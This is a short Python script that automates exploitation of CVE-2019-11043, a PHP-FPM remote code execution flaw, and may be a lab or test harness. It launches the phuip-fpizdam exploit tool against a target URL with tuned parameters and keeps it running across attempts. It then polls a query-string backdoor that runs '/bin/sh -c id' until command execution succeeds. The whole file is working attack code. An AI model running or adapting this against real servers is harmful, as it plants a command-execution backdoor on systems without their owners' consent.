#!/usr/bin/env python3
"""CVE-2019-11043: spawn phuip-fpizdam once, probe target for active backdoor."""
import subprocess, sys, os, signal, time, urllib.request

if len(sys.argv) < 2:
    print("fail", flush=True)
    sys.exit(0)

target_url = sys.argv[1]
base = target_url.rsplit("/", 1)[0]
probe_url = base + "/index.php?a=/bin/sh+-c+'id'&"
GO_BIN = os.path.expanduser("~/go/bin/phuip-fpizdam")
PID_FILE = "/tmp/phuip_fpizdam.pid"
LOG = "/tmp/phuip_fpizdam.log"

def probe():
    try:
        with urllib.request.urlopen(probe_url, timeout=0.5) as r:
            return b"uid=" in r.read()
    except:
        return False

def is_running():
    try:
        with open(PID_FILE) as f:
            os.kill(int(f.read().strip()), 0)
            return True
    except:
        return False

# Fast path: already poisoned
if probe():
    print("ok", flush=True)
    sys.exit(0)

# Spawn phuip-fpizdam only if not already running (persists across attempts)
if not is_running():
    try: os.remove(PID_FILE)
    except: pass
    try:
        with open(LOG, "a") as logf:
            proc = subprocess.Popen(
                [GO_BIN, "--skip-detect", "--qsl", "1755", "--pisos", "182", target_url],
                stdout=logf, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL,
                start_new_session=True,
            )
        with open(PID_FILE, "w") as f:
            f.write(str(proc.pid))
    except Exception as e:
        with open(LOG, "a") as logf:
            logf.write(f"\n[spawn fail] {e}\n")
        print("fail", flush=True)
        sys.exit(0)

# Probe for up to 20s
deadline = time.time() + 20
while time.time() < deadline:
    time.sleep(0.4)
    if probe():
        # Backdoor active! Kill phuip-fpizdam (stop cleanup hang)
        try:
            with open(PID_FILE) as f:
                pid = int(f.read().strip())
            os.killpg(os.getpgid(pid), signal.SIGKILL)
        except:
            pass
        try: os.remove(PID_FILE)
        except: pass
        print("ok", flush=True)
        sys.exit(0)

# Timeout - keep phuip-fpizdam running for next attempt
print("fail", flush=True)
sys.exit(0)